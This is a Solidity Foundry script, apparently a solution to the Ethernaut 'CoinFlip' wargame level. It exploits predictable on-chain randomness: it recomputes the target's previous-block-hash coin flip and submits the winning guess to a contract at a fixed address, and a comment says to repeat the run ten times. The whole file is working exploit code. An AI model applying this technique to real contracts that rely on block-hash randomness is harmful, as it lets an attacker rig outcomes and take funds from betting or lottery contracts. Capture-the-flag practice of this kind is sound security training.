// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "../src/CoinFlip.sol";

contract Solve is Script {
    uint256 lastHash;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    function run() external {
        CoinFlip coinflip = CoinFlip(0x3b116297CEd02F3F93c88ac05D9Ee88bBd847421);
    
        uint256 blockValue = uint256(blockhash(block.number - 1));
        require(blockValue != lastHash, "Try again later");

        lastHash = blockValue;
        bool side = blockValue / FACTOR == 1 ? true : false;
        coinflip.flip(side);
    }
}

// create & run() * 10 (if not reverted)